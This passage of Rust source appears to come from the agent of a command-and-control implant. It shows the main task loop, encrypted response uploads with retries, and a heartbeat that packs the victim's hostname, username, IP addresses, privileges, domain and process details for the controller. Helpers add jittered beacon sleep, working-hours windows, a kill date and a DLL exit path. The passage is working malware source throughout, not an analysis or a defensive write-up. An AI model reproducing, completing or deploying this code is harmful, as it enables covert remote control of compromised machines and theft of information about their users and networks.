        rl_log!("task.kind={} task.id={}", task.kind, task.id);
        *state.epoch_key.lock().unwrap() = Some(epoch_state.epoch_key);
        rl_log!("dispatching task");
        let dispatch_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            exec::dispatch(&task, state, transport, session_key)
        }));
        match dispatch_result {
            Err(panic_info) => {
                let msg = if let Some(s) = panic_info.downcast_ref::<&str>() {
                    s.to_string()
                } else if let Some(s) = panic_info.downcast_ref::<String>() {
                    s.clone()
                } else {
                    "unknown panic".to_string()
                };
                rl_log!("PANIC in dispatch: {}", msg);
                let err_resp = crate::protocol::TaskResponse::ok(&task, format!("[agent] PANIC: {}", msg));
                let err_json = serde_json::to_string(&err_resp).unwrap_or_default();
                if let Some(enc) = epoch::encrypt_message_v2(epoch_state, err_json.as_bytes()) {
                    let output_path_full = format!("{}{}", folder, output_f);
                    transport.upload(&output_path_full, &enc);
                    persist_epoch_state(epoch_state, &epoch_blob_path);
                }
                transport.upload(&input_path, b"MZ");
            }
            Ok(Some(resp)) => {
                rl_log!("dispatch ok, encrypting response");
                let resp_json = serde_json::to_string(&resp).unwrap_or_default();
                match epoch::encrypt_message_v2(epoch_state, resp_json.as_bytes()) {
                    Some(enc) => {
                        rl_log!("encrypt ok, uploading response (v2)");
                        let output_path_full = format!("{}{}", folder, output_f);
                        let mut up = transport.upload(&output_path_full, &enc);
                        for attempt in 1..=2 {
                            if up { break; }
                            rl_log!("output upload retry {}", attempt);
                            std::thread::sleep(Duration::from_secs(2 * attempt));
                            up = transport.upload(&output_path_full, &enc);
                        }
                        persist_epoch_state(epoch_state, &epoch_blob_path);
                        rl_log!("output upload={}", up);
                    }
                    None => { rl_log!("encrypt_response returned None"); }
                }
                transport.upload(&input_path, b"MZ");
                rl_log!("response uploaded");
            }
            Ok(None) => {
                rl_log!("dispatch returned None (exit/kill)");
                transport.upload(&input_path, b"MZ");
                break;
            }
        }

        rl_log!("jitter_sleep post-dispatch");
        std::thread::sleep(Duration::from_secs(sleep_secs));
        rl_log!("jitter_sleep done");
    }
    rl_log!("loop exited");
    _exit_if_dll();
}

// ── helpers ───────────────────────────────────────────────────────────────────

fn build_heartbeat(
    info:      &sysinfo::AgentInfo,
    start_cwd: &str,
    op_cwd:    &str,
    blob:      &str,
    seq:       u64,
    next_hb_at: u64,
) -> String {
    #[cfg(all(windows, stratum_debug))]
    macro_rules! bh_log {
        ($s:literal) => { unsafe { extern "system" { fn OutputDebugStringA(s: *const u8); } OutputDebugStringA(concat!("[BH] ", $s, "\0").as_ptr()); } }
    }
    #[cfg(not(all(windows, stratum_debug)))]
    macro_rules! bh_log { ($s:literal) => {} }

    bh_log!("hw::expand");
    let expanded   = hw::expand(blob);
    bh_log!("to_string_lossy");
    let expanded_s = expanded.to_string_lossy();
    bh_log!("blob_field");
    let blob_field = if expanded.exists() { expanded_s.as_ref() } else { "" };
    bh_log!("format");
    let san = |s: &str| s.replace('|', "_");
    let r = format!(
        "{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}",
        unix_now(),
        san(&info.hostname), san(&info.username), san(&info.ip_int), san(&info.os),
        san(&info.privs), san(start_cwd), san(op_cwd), san(&info.ip_ext),
        info.pid, san(&info.process), san(&info.domain),
        san(blob_field),
        san(&expanded_s),
        seq,
        next_hb_at,
    );
    bh_log!("done");
    r
}

pub fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Compute the jittered sleep duration (seconds) without actually sleeping.
pub(crate) fn compute_sleep_secs(state: &Arc<exec::AgentState>) -> u64 {
    use std::sync::atomic::Ordering;
    use rand_distr::{Distribution, LogNormal};
    let base   = state.base_sleep.load(Ordering::Relaxed) as f64;
    let jitter = state.jitter_pct.load(Ordering::Relaxed) as f64;
    let secs = if jitter > 0.0 {
        let sigma  = (jitter / 100.0).max(0.01);
        let mu     = base.ln() - sigma * sigma / 2.0;
        let ln     = LogNormal::new(mu, sigma).unwrap_or_else(|_| {
            LogNormal::new(base.ln(), 0.1).unwrap()
        });
        ln.sample(&mut rand::thread_rng())
    } else {
        base
    };
    (secs as u64).max(5)
}

pub(crate) fn jitter_sleep(state: &Arc<exec::AgentState>) {
    std::thread::sleep(Duration::from_secs(compute_sleep_secs(state)));
}

pub(crate) fn in_window(start: &str, end: &str) -> bool {
    if start.is_empty() || end.is_empty() { return true; }
    let now      = chrono::Local::now();
    let now_mins = now.hour() * 60 + now.minute();
    let parse    = |s: &str| -> Option<u32> {
        let mut p = s.splitn(2, ':');
        let h: u32 = p.next()?.parse().ok()?;
        let m: u32 = p.next()?.parse().ok()?;
        Some(h * 60 + m)
    };
    let (s, e) = match (parse(start), parse(end)) {
        (Some(s), Some(e)) => (s, e),
        _ => return true,
    };
    if s <= e { now_mins >= s && now_mins < e }
    else      { now_mins >= s || now_mins < e }
}

pub(crate) fn kill_date_expired(kill_date: &str) -> bool {
    if kill_date.is_empty() { return false; }
    let now = chrono::Local::now();
    let today = format!("{:04}-{:02}-{:02}", now.year(), now.month(), now.day());
    today.as_str() >= kill_date
}

pub(crate) fn decode_pem(b64: &str) -> Option<String> {
    use base64::{engine::general_purpose::STANDARD as B64, Engine};
    String::from_utf8(B64.decode(b64.trim()).ok()?).ok()
}
